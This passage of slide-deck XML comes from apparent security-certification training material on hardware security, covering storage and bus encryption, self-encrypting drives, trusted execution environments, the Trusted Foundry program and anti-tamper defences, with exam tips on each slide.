                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Instead of verifying digital signatures of code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Calculates code hashes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Stores hashes of programs that have been run</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Securely sends hashes to management station</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567</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Firmware Security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Trusted firmware updates</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Built-in capability to download, verify, and swap firmware images</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Avoids overwrite failures that result in unbootable devices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568</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE ENCRYPTION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Storage Encryption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Storage encryption protects data at rest so that if a drive or device is lost, stolen, or improperly decommissioned, the stored contents remain unreadable without the decryption key. The most common form is full-disk encryption (FDE), which encrypts the entire volume including the operating system, page file, and temporary files.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  FDE can be implemented in software, where the operating system or a product such as BitLocker or LUKS performs the cryptographic operations using the host CPU, or in hardware, where the drive itself performs encryption transparently. Software FDE is flexible and low-cost but consumes CPU cycles and depends on the OS being trustworthy, while hardware encryption offloads the work and keeps keys off the general-purpose processor.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because encrypting storage is a primary defense-in-depth control for confidentiality and is often a compliance requirement, and because understanding the implementation determines the real-world attack surface and recovery options.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions asking you to compare software-based FDE against hardware-based encryption and to identify which control protects data at rest on a lost or stolen device.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569</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE ENCRYPTION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Storage Encryption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Full-disk encryption (FDE)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Hardware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570</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE ENCRYPTION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Hardware Encryption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Hardware encryption performs cryptographic operations on a dedicated controller rather than on the host CPU, most commonly implemented as a self-encrypting drive (SED) that encrypts and decrypts every block transparently as data moves to and from the platters or flash. The drive always encrypts the media with an internal data-encryption key, so encryption is effectively always on.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The user supplies a password or passphrase, but that password is not used directly to scramble the data; instead it is used to encrypt (wrap) the drive's media-encryption key, and the resulting encrypted key is stored in nonvolatile memory inside the disk controller. This design lets an administrator perform a near-instant cryptographic erase by discarding the media key, and it lets the password be changed without re-encrypting the entire drive.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because SEDs offload work from the CPU, resist software-based key extraction better than pure software FDE, and support rapid sanitization, but the plaintext is still exposed in memory once data is read, which shapes the residual risk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests whether you understand that a self-encrypting drive stores an encrypted media key in the controller and that the user password unlocks that key rather than being the key itself.</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571</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE ENCRYPTION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Hardware Encryption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Self-encrypting drive (SED)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  User provides password</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Password gets used to encrypt key</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Encrypted key is stored in nonvolatile memory of the disk controller</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572</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE ENCRYPTION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Bus Encryption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Bus encryption addresses a gap in self-encrypting drives, where data is decrypted to plaintext at the disk controller and then travels across the internal data bus in the clear, exposing it to bus-probing or memory-snooping attacks. It moves the cryptographic module off the disk controller and closer to or inside the CPU so that data remains ciphertext while it is on the bus and is only decrypted within a protected boundary.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This approach requires a dedicated cryptoprocessor chip that decrypts instructions and data only inside a trusted boundary, meaning software must be specifically compiled or provisioned to run in that protected environment. Because of that requirement it imposes real functional limitations and cannot run arbitrary off-the-shelf software.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Bus encryption is expensive, complex, and restrictive, so it is used for high-assurance embedded and special-purpose systems rather than general-purpose computers; an analyst should recognize it as a strong but niche control when evaluating protection of data in transit inside a machine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions contrasting bus encryption with SEDs, noting that bus encryption keeps data as ciphertext on the data bus and is impractical for general-purpose computers due to cost and complexity.</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573</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE ENCRYPTION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Bus Encryption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SED still exposes plaintext once data gets read from the disk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Moving crypto module from the disk controller to the CPU</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Keeps data on the bus as ciphertext</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Requires a dedicated chip (cryptoprocessor)</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574</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE ENCRYPTION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Bus Encryption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Bus encryption is not suitable for general purpose computers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Expensive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Complex</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Functional limitations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575</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE SECURITY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Secure Processing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Secure processing provides a hardware-backed protected runtime that isolates sensitive code and data from the main operating system and other applications, so that even a compromised OS cannot read or tamper with what runs inside it. This is typically delivered as a trusted execution environment (TEE) or a secure enclave carved out of the main processor.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A TEE is a runtime environment that limits how programs interact with one another and with the outside world, enforcing confidentiality and integrity for the code and data loaded into it, and reputable implementations undergo rigorous assessment prior to certification so their isolation guarantees can be trusted. Common uses include protecting cryptographic keys, biometric templates, digital-rights material, and attestation secrets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because secure enclaves shrink the attack surface for the most sensitive operations and support hardware root-of-trust and remote attestation, which are increasingly relied on for verifying system integrity and protecting credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect items describing a trusted execution environment or secure enclave and asking why an isolated runtime protects sensitive operations such as key handling from the main OS.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576</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE SECURITY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Secure Processing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Trusted execution environment (TEE)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Rigorous assessment prior to certification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Secure enclave</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Runtime environment that limits how programs interact with one another and the outside world</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577</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE SECURITY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TEE and REE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A processor that supports secure processing effectively runs two worlds side by side: the rich execution environment (REE), where the normal operating system and general applications run, and the trusted execution environment (TEE), where isolated, protected code runs shielded from the REE. Sensitive workloads are placed in the TEE precisely because the REE is large, exposed, and cannot be fully trusted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The separation is enforced by processor security extensions, which are additional CPU instructions and hardware modes such as Intel SGX or Arm TrustZone that support TEE functionality by controlling when execution transitions between the secure and non-secure worlds and by restricting the REE's access to TEE memory. Without these hardware extensions, software isolation alone could not resist a compromised kernel.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because knowing whether a platform provides a genuine hardware TEE versus only software isolation determines how much assurance can be placed in on-device key storage, attestation, and other security-critical functions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam may ask you to distinguish the trusted execution environment from the rich execution environment and to identify processor security extensions as the CPU instructions that enable that separation.</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578</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE SECURITY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TEE and REE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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Processor security extensions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  CPU instructions that support TEE functionality</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_b6f5bea0b9.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="1852548"/>
            <a:ext cx="4937760" cy="4158744"/>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579</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE SECURITY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Trusted Foundry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Trusted Foundry is a U.S. Department of Defense program that certifies semiconductor manufacturers so that the supply chain for DoD mission-critical systems is hardened against tampering, counterfeiting, and the insertion of malicious logic or backdoors during chip fabrication. It gives the government assurance that microelectronics in weapons and other critical platforms come from vetted, secure sources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The certification process is rigorous, covering the security and integrity of design, fabrication, packaging, and handling, and fewer than 100 companies have passed it to be designated as trusted foundries. This deliberate scarcity reflects how demanding the assurance requirements are.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because hardware supply-chain integrity is a growing threat vector, and the Trusted Foundry concept illustrates how organizations manage the risk that vulnerabilities or implants could be introduced at the manufacturing layer, below the reach of software controls.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect a supply-chain question identifying the Trusted Foundry program as a DoD initiative that vets a small number of certified manufacturers to prevent tampered or counterfeit microelectronics.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580</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE SECURITY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Trusted Foundry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US DoD program</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Ensures that the supply chain for all DoD mission-critical systems is hardened</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Fewer than 100 companies have passed the rigorous certification process to be designated as trusted foundries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581</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE SECURITY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Anti-Tamper Techniques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Anti-tamper techniques are physical and design defenses that protect a chip's secrets from adversaries who have physical possession of the hardware and attempt to extract keys or reverse-engineer logic. Attackers use chip attacks such as microprobing, which applies voltage to internal conductors and records the results to read out data, and visual analysis, which carefully removes the chip's covering layer by layer to photograph and map the circuitry.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  To thwart these, chip manufacturers employ countermeasures such as emitting random signals to confuse microprobing so the attacker cannot correlate probe readings, and building tamper-detection meshes or sensors that detect when the chip's casing or die coating is compromised. When such tampering is detected, the chip can immediately place zeros into its nonvolatile memory, destroying stored keys before they can be extracted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because tamper resistance underpins the trust placed in HSMs, smart cards, secure enclaves, and other cryptographic hardware, and knowing these defenses clarifies why physical access does not automatically defeat well-designed key storage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions describing physical chip attacks such as microprobing or layer-by-layer decapsulation and asking which countermeasures zeroize secrets or generate noise to defeat them.</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582</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE SECURITY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Anti-Tamper Techniques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Chip attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Microprobing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Apply voltage to various conductors and recording the results</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Visual analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Carefully removing the chip’s covering, layer by layer</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583</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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HARDWARE SECURITY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Anti-Tamper Techniques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Chip manufacturers employ techniques to thwart tampering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
